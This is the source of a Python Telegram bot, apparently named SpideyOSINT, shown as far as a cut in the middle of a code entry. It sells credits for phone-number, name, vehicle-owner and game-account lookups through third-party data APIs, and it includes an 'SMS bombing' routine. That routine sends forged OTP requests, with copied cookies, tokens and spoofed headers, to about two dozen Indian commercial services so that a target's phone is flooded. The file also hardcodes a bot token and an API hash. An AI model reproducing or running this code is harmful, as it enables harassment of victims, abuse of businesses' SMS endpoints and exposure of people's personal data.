import os
os.system('pip install requests')
os.system('pip install telethon')

import requests, time, random, json, re, asyncio, threading, urllib
from telethon import TelegramClient, events, Button
from collections import defaultdict
from datetime import datetime

BOT_TOKEN = "8655956389:AAHITB8xDYmIPYDSa_dOVE4P6CZgfiR77ac"
API_ID = 6
API_HASH = 'eb06d4abfb49dc3eeb1aeb98ae0f581e'
ADMIN_ID = 1725301348
CONTACT_LINK = "https://t.me/HloSpidey"
CHANNEL_LINK = "https://t.me/+J-0a5CaeIZZiYzNl"
PHOTO_URL = "https://t.me/c/3666940027/31"
NUM_API = "https://v7ban-num-info.vercel.app/api/number?number={}"
NAME_API = "https://number-to-name-ten.vercel.app/info?name=91{}"
FF_API = "https://abbas-apis.vercel.app/api/ff-info?uid={}"
VEHICLE_API = "https://admin.gbssystems.com/public/storage/customer/28/api.php?q={}"
STORAGE_CHANNEL = -1003666940027
ADMIN_DATA_MSG_ID = 27
USER_DATA_MSG_ID = 29
USERS_LIST_MSG_ID = 28

CLAIM_5_LINK = "https://t.me/+J-0a5CaeIZZiYzNl"
CLAIM_3_LINK = "https://t.me/spideystuff"

client = TelegramClient("SpideyOSINT2_BOT_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_state = {}
user_last_command = defaultdict(lambda: {"num": 0, "ff": 0, "bomb": 0, "vnum": 0})
user_waiting_messages = {}
broadcast_waiting = False
broadcast_active = False
admin_data = {"numbers": [], "ff_uids": []}
users_data = {}
users_list = set()
bombing_active = {}
bombing_threads = {}
request_counts = {}
user_credits = defaultdict(lambda: 5)
user_subscription = defaultdict(lambda: {"type": None, "expiry": 0})
user_claimed = defaultdict(lambda: {"v1": False, "v2": False})
session = requests.Session()

async def load_admin_data():
    global admin_data
    try:
        msg = await client.get_messages(STORAGE_CHANNEL, ids=ADMIN_DATA_MSG_ID)
        if msg and msg.text:
            admin_data = {"numbers": [], "ff_uids": []}
            num_match = re.search(r'Numbers : \[(.*?)\]', msg.text)
            if num_match and num_match.group(1).strip():
                admin_data["numbers"] = re.findall(r'\d+', num_match.group(1))
            ff_match = re.search(r'FF UIDs : \[(.*?)\]', msg.text)
            if ff_match and ff_match.group(1).strip():
                admin_data["ff_uids"] = re.findall(r'\d+', ff_match.group(1))
    except:
        admin_data = {"numbers": [], "ff_uids": []}

async def load_users_data():
    global users_data
    try:
        msg = await client.get_messages(STORAGE_CHANNEL, ids=USER_DATA_MSG_ID)
        if msg and msg.text:
            users_data = {}
            users_section = re.search(r'━━━ 👤 Users ━━━\n(.*?)(?:\n|$)', msg.text, re.DOTALL)
            if users_section:
                lines = users_section.group(1).strip().split('\n')
                current_user = None
                for line in lines:
                    if line.startswith('📱'):
                        current_user = line.replace('📱', '').strip().rstrip(':')
                        users_data[current_user] = {"numbers": [], "ff_uids": []}
                    elif line.startswith('   📞 Numbers:') and current_user:
                        users_data[current_user]["numbers"] = re.findall(r'\d+', line)
                    elif line.startswith('   🎮 FF UIDs:') and current_user:
                        users_data[current_user]["ff_uids"] = re.findall(r'\d+', line)
    except:
        users_data = {}

async def load_users_list():
    global users_list, user_credits, user_subscription, user_claimed
    try:
        msg = await client.get_messages(STORAGE_CHANNEL, ids=USERS_LIST_MSG_ID)
        if msg and msg.text:
            users_list = set()
            for line in msg.text.split('\n'):
                line = line.strip()
                if line.isdigit():
                    users_list.add(int(line))
                elif line:
                    parts = line.split()
                    if parts and parts[0].isdigit():
                        uid = int(parts[0])
                        users_list.add(uid)
                        for part in parts[1:]:
                            if part.endswith('💎'):
                                user_credits[uid] = int(part.replace('💎', ''))
                            elif part.endswith('D'):
                                user_subscription[uid] = {"type": "days", "expiry": time.time() + (int(part.replace('D', '')) * 86400)}
                            elif part == 'v1': user_claimed[uid]['v1'] = True
                            elif part == 'v2': user_claimed[uid]['v2'] = True
                            elif part == 'v12':
                                user_claimed[uid]['v1'] = True
                                user_claimed[uid]['v2'] = True
    except:
        users_list = set()

async def update_users_list_msg():
    try:
        msg_text = "📊 Users List :\n\n"
        for uid in sorted(users_list):
            line = str(uid)
            if user_credits.get(uid, 5) != 5:
                line += f" {user_credits[uid]}💎"
            sub = user_subscription.get(uid)
            if sub and sub.get('expiry', 0) > time.time():
                days_left = int((sub['expiry'] - time.time()) / 86400)
                line += f" {days_left}D"
            if user_claimed[uid].get('v1') and user_claimed[uid].get('v2'): line += " v12"
            elif user_claimed[uid].get('v1'): line += " v1"
            elif user_claimed[uid].get('v2'): line += " v2"
            msg_text += f"{line}\n"
        await client.edit_message(STORAGE_CHANNEL, USERS_LIST_MSG_ID, msg_text)
    except: pass

async def update_admin_data_msg():
    try:
        await client.edit_message(STORAGE_CHANNEL, ADMIN_DATA_MSG_ID, f"📋 **ADMIN PROTECTED DATA**\n\nNumbers : {admin_data.get('numbers', [])}\nFF UIDs : {admin_data.get('ff_uids', [])}", parse_mode='markdown')
    except: pass

async def update_users_data_msg():
    try:
        msg_text = "📋 **PROTECTED DATA**\n\n━━━ 👤 Users ━━━\n"
        for username, data in users_data.items():
            if data.get('numbers') or data.get('ff_uids'):
                msg_text += f"📱 {username} :\n   📞 Numbers: {data.get('numbers', [])}\n   🎮 FF UIDs: {data.get('ff_uids', [])}\n"
        await client.edit_message(STORAGE_CHANNEL, USER_DATA_MSG_ID, msg_text, parse_mode='markdown')
    except: pass

def add_user(user_id):
    if user_id not in users_list and user_id != ADMIN_ID:
        users_list.add(user_id)
        asyncio.create_task(update_users_list_msg())

def get_all_users(): return list(users_list)
def get_user_count(): return len(users_list)

def is_number_protected(number):
    if number in admin_data.get("numbers", []): return True
    for data in users_data.values():
        if number in data.get("numbers", []): return True
    return False

def is_ff_protected(uid):
    if uid in admin_data.get("ff_uids", []): return True
    for data in users_data.values():
        if uid in data.get("ff_uids", []): return True
    return False

def has_access(user_id):
    sub = user_subscription.get(user_id)
    if sub and sub.get('expiry', 0) > time.time(): return True
    return user_credits.get(user_id, 5) > 0

def deduct_credit(user_id, amount):
    sub = user_subscription.get(user_id)
    if sub and sub.get('expiry', 0) > time.time(): return True
    if user_credits.get(user_id, 5) >= amount:
        user_credits[user_id] -= amount
        asyncio.create_task(update_users_list_msg())
        return True
    return False

async def check_rate_limit(user_id, command):
    last_time = user_last_command[user_id][command]
    if (time.time() - last_time) < 15:
        return False, int(15 - (time.time() - last_time))
    return True, 0

async def update_rate_limit(user_id, command):
    user_last_command[user_id][command] = time.time()

def extract_number(text):
    cleaned = re.sub(r'[\s\+\-\(\)]', '', text)
    digits = re.findall(r"\d", cleaned)
    if len(digits) >= 10:
        number = "".join(digits)
        if number.startswith('91') and len(number) > 10: number = number[2:]
        if len(number) > 10: number = number[-10:]
        return number if len(number) == 10 else None
    return None

def format_date(text):
    if not text: return "N/A"
    text = text.replace("At", "at")
    text = re.sub(r"\s+", " ", text)
    parts = text.split()
    if parts and parts[0].startswith("0"): parts[0] = parts[0][1:]
    return " ".join(parts) if parts else text

async def auto_delete(msg, delay=15):
    await asyncio.sleep(delay)
    try: await msg.delete()
    except: pass

async def delete_15sec(msg):
    await asyncio.sleep(15)
    try: await msg.delete()
    except: pass

async def delete_waiting_message(user_id):
    if user_id in user_waiting_messages:
        try: await user_waiting_messages[user_id].delete()
        except: pass
        del user_waiting_messages[user_id]

async def get_photo_from_message():
    try:
        parts = PHOTO_URL.split('/')
        msg = await client.get_messages(int("-100" + parts[-2]), ids=int(parts[-1]))
        return msg.media if msg and msg.media else None
    except: return None

# ================= BOMBING APIS SECTION =================
def getapi(pn, lim, cc):
    cc = str(cc)
    pn = str(pn)
    lim = int(lim)
    
    url_urllib = [
        "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + str(cc) + "&nod=4&phone=" + pn, 
        "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn, 
        "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn
    ]
    
    if lim < len(url_urllib):
        try:
            urllib.request.urlopen(str(url_urllib[lim]), timeout=5)
            return True
        except: return False
    
    try:
        if lim == 3: # PharmEasy
            headers = {
                'Host': 'pharmeasy.in', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
                'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://pharmeasy.in/', 'Content-Type': 'application/json', 'Connection': 'keep-alive',
            }
            data = {"contactNumber":pn}
            response = session.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 4: # Hero MotoCorp 
            cookies = {
                '_ga': 'GA1.2.1273460610.1561191565', '_gid': 'GA1.2.172574299.1561191565',
                'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
            }
            headers={
                'Host': 'www.heromotocorp.com', 'Connection': 'keep-alive', 'Accept': '*/*', 
                'Origin': 'https://www.heromotocorp.com', 'X-Requested-With': 'XMLHttpRequest', 
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/', 'Accept-Encoding': 'gzip, deflate, br', 
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
              'mobile_no': pn, 'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
              'mobile_no_otp': '', 'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
            }
            response = session.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 5: # IndiaLends
            cookies = {
                '_ga': 'GA1.2.1483885314.1559157646', '_fbp': 'fb.1.1559157647161.1989205138', 
                'ASP.NET_SessionId': 'ioqkek5lbgvldlq4i3cmijcs', '_gid': 'GA1.2.969623705.1560660444',
            }
            headers = {
                'Host': 'indialends.com', 'Connection': 'keep-alive', 'Accept': '*/*', 
                'Origin': 'https://indialends.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36', 
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'Referer': 'https://indialends.com/personal-loan', 'Accept-Encoding': 'gzip, deflate, br', 
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
              'aeyder03teaeare': '1', 'ertysvfj74sje': cc, 'jfsdfu14hkgertd': pn, 'lj80gertdfg': '0'
            }
            response = session.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 6: # Flipkart 1
            headers = {
            'host': 'www.flipkart.com', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 
            'accept': '*/*', 'accept-language': 'en-US,en;q=0.5', 'accept-encoding': 'gzip, deflate, br', 
            'referer': 'https://www.flipkart.com/', 'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop', 
            'origin': 'https://www.flipkart.com', 'connection': 'keep-alive', 
            'Content-Type': 'application/json; charset=utf-8'}
            data = {"loginId":[f"+{cc}{pn}"],"supportAllStates":True} 
            response = session.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 7: # Flipkart 2 
            cookies = {
                'T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050', 'SWAB': 'build-44be9e47461a74d737914207bcbafc30', 
                'lux_uid': '155867904381892986', 'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
            }
            headers = {
                'Host': 'www.flipkart.com', 'Connection': 'keep-alive', 'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop', 
                'Origin': 'https://www.flipkart.com', 'Save-Data': 'on', 
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36', 
                'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*', 
                'Referer': 'https://www.flipkart.com/', 'Accept-Encoding': 'gzip, deflate, br', 
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
              'loginId': f'+{cc}{pn}', 'state': 'VERIFIED', 'churnEmailRequest': 'false'
            }
            response = session.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 8: # Lenskart
            headers = {
                'Host': 'www.ref-r.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0', 
                'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'en-US,en;q=0.5', 
                'Accept-Encoding': 'gzip, deflate, br', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'X-Requested-With': 'XMLHttpRequest', 'DNT': '1', 'Connection': 'keep-alive',
            }
            data = {'mobile': pn, 'submit': '1', 'undefined': ''}
            response = session.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 9: # Practo 
            headers = {
                'X-DROID-VERSION': '4.12.5', 'API-Version': '2.0', 'user-agent': 'samsung SM-G9350 0 4.4.2', 
                'client-version': 'Android-4.12.5', 'X-DROID-VERSION-CODE': '158', 'Accept': 'application/json', 
                'client-name': 'Practo Android App', 'Content-Type': 'application/x-www-form-urlencoded', 
                'Host': 'accounts.practo.com', 'Connection': 'Keep-Alive', }
            data = {
              'client_name': 'Practo Android App', 'mobile': f'+{cc}{pn}', 'fingerprint': '', 'device_name':'samsung+SM-G9350'}
            response = session.post( "https://accounts.practo.com/send_otp", headers=headers, data=data, timeout=5)
            return "success" in response.text.lower()

        elif lim == 10: # PizzaHut 
            headers = {
                'Host': 'm.pizzahut.co.in', 'content-length': '114', 'origin': 'https://m.pizzahut.co.in', 
                'authorization': 'Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5iTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4', 
                'x-source-origin': 'PWAFW', 'content-type': 'application/json', 'accept': 'application/json, text/plain, */*', 
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36', 
                'save-data': 'on', 'languagecode': 'en', 'referer': 'https://m.pizzahut.co.in/login', 
                'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6', 'cookie': 'AKA_A2=A'}
            data = {"customer":{"MobileNo":pn,"UserName":pn,"merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}
            response = session.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 11: # Goibibo
            headers = {
                'host': 'www.goibibo.com', 'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0', 
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.5', 
                'accept-encoding': 'gzip, deflate, br', 'referer': 'https://www.goibibo.com/mobile/?sms=success', 
                'content-type': 'application/x-www-form-urlencoded', 'connection': 'keep-alive', 
                'upgrade-insecure-requests': '1'}
            data = {'mbl': pn}
            response = session.post('https://www.goibibo.com/common/downloadsms/', headers=headers, data=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 12: # Apollo Pharmacy
            headers = {
                'Host': 'www.apollopharmacy.in', 'accept': '*/*', 
                'origin': 'https://www.apollopharmacy.in', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36', 
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'referer': 'https://www.apollopharmacy.in/sociallogin/mobile/login/', 
                'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6', 
                'cookie': 'section_data_ids=%7B%22cart%22%3A1560239751%7D'}
            data = {'mobile': pn}
            response = session.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers=headers, data=data, timeout=5)
            return "sent" in response.text.lower()

        elif lim == 13: # Ajio 
            headers = {
                'Host': 'www.ajio.com', 'Connection': 'keep-alive', 'Accept': 'application/json',
                'Origin': 'https://www.ajio.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                'content-type': 'application/json', 'Referer': 'https://www.ajio.com/signup',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'}
            data = {"firstName":"SpeedX","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":pn,"requestType":"SENDOTP"}
            response = session.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, json=data, timeout=5)
            return '"statusCode":"1"' in response.text

        elif lim == 14: # AltBalaji
            headers = {
                'Host': 'api.cloud.altbalaji.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*',
                'Origin': 'https://lite.altbalaji.com', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36',
                'Content-Type': 'application/json;charset=UTF-8', 'Referer': 'https://lite.altbalaji.com/subscribe?progress=input',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'}
            data = {"country_code":cc,"phone_number":pn}
            response = session.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data, timeout=5)
            return response.text == '24f467b24087ff48c96321786d89c69f'

        elif lim == 15: # Aala 
            headers = {
                'Host': 'www.aala.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Origin': 'https://www.aala.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'https://www.aala.com/',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5'}
            data = {'email': f'{cc}{pn}', 'firstname': 'SpeedX', 'lastname': 'SpeedX'}
            response = session.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, data=data, timeout=5)
            return 'code:' in response.text

        elif lim == 16: # Grab
            data = {
              'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{pn}', 'templateID': 'pax_android_production'
            }
            response = session.post('https://api.grab.com/grabid/v1/phone/otp', data=data, timeout=5)
            return response.status_code == 200

        elif lim == 17: # GheeAPI (gokwik.co - 19g6im8srkz9y)
            headers = {
              "accept": "application/json, text/plain, */*", 
              "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
              "content-type": "application/json", 
              "gk-merchant-id": "19g6im8srkz9y", 
              "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 18: # EdzAPI (gokwik.co - 19an4fq2kk5y)
            headers = {
              "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
              "content-type": "application/json", 
              "gk-merchant-id": "19an4fq2kk5y"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200
            
        elif lim == 19: # FalconAPI (api.breeze.in)
            headers = {
              "Content-Type": "application/json", 
              "x-device-id": "A1pKVEDhlv66KLtoYsml3", 
              "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
            }
            data = {
                "phoneNumber": pn,
                "authVerificationType": "otp",
                "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"},
                "countryCode": f"+{cc}"
            }
            response = session.post("https://api.breeze.in/session/start", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 20: # NeclesAPI (gokwik.co - 19g6ilhej3mfc)
            headers = {
              "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA", 
              "Content-Type": "application/json", 
              "gk-merchant-id": "19g6ilhej3mfc", 
              "gk-signature": "645574", 
              "gk-timestamp": "58581194"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200
            
        elif lim == 21: # KisanAPI (oidc.agrevolution.in)
            headers = {
              "Content-Type": "application/json"
            }
            data = {"mobile_number": pn, "client_id": "kisan-app"}
            response = session.post("https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", headers=headers, json=data, timeout=5)
            return response.status_code == 200 or "true" in response.text.lower()
            
        elif lim == 22: # PWAPI (api.penpencil.co)
            headers = {
              "Accept": "*/*", 
              "Content-Type": "application/json", 
              "randomid": "de6f4924-22f5-42f5-ad80-02080277eef7"
            }
            data = {
                "mobile": pn,
                "organizationId": "5eb393ee95fab7468a79d189"
            }
            response = session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=2", headers=headers, json=data, timeout=5)
            return response.status_code == 200
            
        elif lim == 23: # KahatBook (api.khatabook.com)
            headers = {
              "Content-Type": "application/json", 
              "x-kb-app-locale": "en", 
              "x-kb-app-name": "Khatabook Website", 
              "x-kb-app-version": "000100", 
              "x-kb-new-auth": "false", 
              "x-kb-platform": "web"
            }
            data = {
                "country_code": f"+{cc}",
                "phone": pn,
                "app_signature": "Jc/Zu7qNqQ2"
            }
            response = session.post("https://api.khatabook.com/v1/auth/request-otp", headers=headers, json=data, timeout=5)
            return response.status_code == 200 or "success" in response.text.lower()
            
        elif lim == 24: # JockeyAPI (www.jockey.in)
            cookies = {
                "localization": "IN", "_shopify_y": "6556c530-8773-4176-99cf-f587f9f00905", 
                "_tracking_consent": "3.AMPS_INUP_f_f_4MXMfRPtTkGLORLJPTGqOQ", "_ga": "GA1.1.377231092.1757430108", 
                "_fbp": "fb.1.1757430108545.190427387735094641", "_quinn-sessionid": "a2465823-ceb3-4519-9f8d-2a25035dfccd", 
                "cart": "hWN2mTp3BwfmsVi0WqKuawTs?key=bae7dea0fc1b412ac5fceacb96232a06", 
                "wishlist_id": "7531056362789hypmaaup", "wishlist_customer_id": "0", 
                "_shopify_s": "d4985de8-eb08-47a0-9f41-84adb52e6298"
            }
            headers = {
                "accept": "*/*", 
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                "origin": "https://www.jockey.in", 
                "referer": "https://www.jockey.in/"
            }
            url = f"https://www.jockey.in/apps/jotp/api/login/send-otp/+{cc}{pn}?whatsapp=true"
            response = session.get(url, headers=headers, cookies=cookies, timeout=5)
            return response.status_code == 200

        elif lim == 25: # FasiinAPI (gokwik.co - 19kc37zcdyiu)
            headers = {
              "Content-Type": "application/json", 
              "Accept": "application/json", 
              "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA", 
              "gk-merchant-id": "19kc37zcdyiu", 
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200
        
        # 26: VidyaKul
        elif lim == 26: 
            cookies = {
                'gcl_au': '1.1.1308751201.1759726082', 
                'initialTrafficSource': 'utmcsr=live|utmcmd=organic|utmccn=(not set)|utmctr=(not provided)', 
                '__utmzzses': '1', 
                '_fbp': 'fb.1.1759726083644.475815529335417923', 
                '_ga': 'GA1.2.921745508.1759726084', 
                '_gid': 'GA1.2.1800835709.1759726084', 
                '_gat_UA-106550841-2': '1', 
                '_hjSession_2242206': 'eyJpZCI6ImQ0ODFkMjIwLTQwMWYtNDU1MC04MjZhLTRlNWMxOGY4YzEyYSIsImMiOjE3NTk3MjYwODQyMDMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=', 
                'trustedsite_visit': '1', 
                'ajs_anonymous_id': '1681028f-79f7-458e-bf04-00aacdefc9d3', 
                '_hjSessionUser_2242206': 'eyJpZCI6IjZhNWE4MzJlLThlMzUtNTNjNy05N2ZjLTI0MzNmM2UzNjllMSIsImNyZWF0ZWQiOjE3NTk3MjYwODQyMDEsImV4aXN0aW5nIjp0cnVlfQ==', 
                'vidyakul_selected_languages': 'eyJpdiI6IkJzY1FUdUlodlRMVXhCNnE5V2RDT1E9PSIsInZhbHVlIjoiTTBcL2RKNmU2b1Fab1BnS3FqSDBHQktQVlk0SXRmczIxSGJrakhOaTJ5dllyclZiTk5FeVBGREE3dzVJbXI5T0oiLCJtYWMiOiI5MWU4NDViZDVhOTFjM2NmMmYyZjYwMmRiMmQyNGU4NTRlYjQ0MGM3ZTJmNjIzM2Q2M2ZhNTM0ZTVjMGUzZmUyIn0%3D', 
                'WZRK_S_4WZ-K47-ZZ6Z': '%7B%22p%22%3A3%7D', 
